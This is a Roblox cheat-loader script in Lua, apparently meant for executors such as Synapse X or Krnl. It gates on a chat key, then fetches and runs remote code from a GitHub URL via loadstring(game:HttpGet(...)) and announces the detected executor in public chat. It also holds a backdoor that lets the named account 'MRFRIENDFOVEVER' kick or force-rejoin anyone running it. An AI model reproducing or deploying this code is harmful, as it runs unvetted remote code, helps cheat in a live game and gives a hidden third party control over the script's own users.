game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('Waiting For The Key (??)', 'All')

local player = game.Players.LocalPlayer
local yes = "NotWhitelisted"

print(yes)

if yes == "NotWhitelisted" then
       print"WaitingForTheKey"
       
       --Chat Doesnt Match
       player.Chatted:Connect(function(cht)
         if cht.message ~= "?load xyz.lua" then
             if yes == "NotWhitelisted" then
                 print"Not Whitelisted"
                 player:Kick('Wrong key ðŸ¤¡ðŸ¤¡')
            end
         end
    end)
       
       --Chat Match
      player.Chatted:Connect(function(cht)
         if cht:match("?load xyz.lua") then
           yes = "Whitelisted"
          print(yes)
          loadstring(game:HttpGet(('https://raw.githubusercontent.com/ForgotQuiz/ImNotOk/main/PrisonLifeCommands'),true))()
          local executor =
                is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
                secure_load and "Sentinel" or
                KRNL_LOADED and "Krnl" or
                SONA_LOADED and "Sona" or
                "Lvl 6 Exploit"
                
                game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('Commands Loaded (6.8) * Using '.. executor .. ' *', 'All')
        end
    end)
end

local Action = game.Players:GetPlayers()
  for i = 1,#Action do
Action[i].Chatted:connect(function(msg, recipient)
    if Action[i].Name == "MRFRIENDFOVEVER" then
        local splitString = string.split(msg, " ")
        local player = game.Players.LocalPlayer
        if splitString[1] == "?kick" then
        print("Kicked ".. splitString[2])
         if player.Name == splitString[2] and splitString[2] ~= "MRFRIENDFOVEVER" then 
                player:Kick("ðŸ¤¡ Expulsado por un administrador ðŸ¤¡")
            end
        end
    end
  end)
end

local Action = game.Players:GetPlayers()
  for i = 1,#Action do
Action[i].Chatted:connect(function(msg, recipient)
    if Action[i].Name == "MRFRIENDFOVEVER" then
        local splitString = string.split(msg, " ")
        local player = game.Players.LocalPlayer
        if splitString[1] == "?rjuser" then
        print("Kicked ".. splitString[2])
         if player.Name == splitString[2] and splitString[2] ~= "MRFRIENDFOVEVER" then 
                wait(.1)
		game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
            end
        end
    end
  end)
end

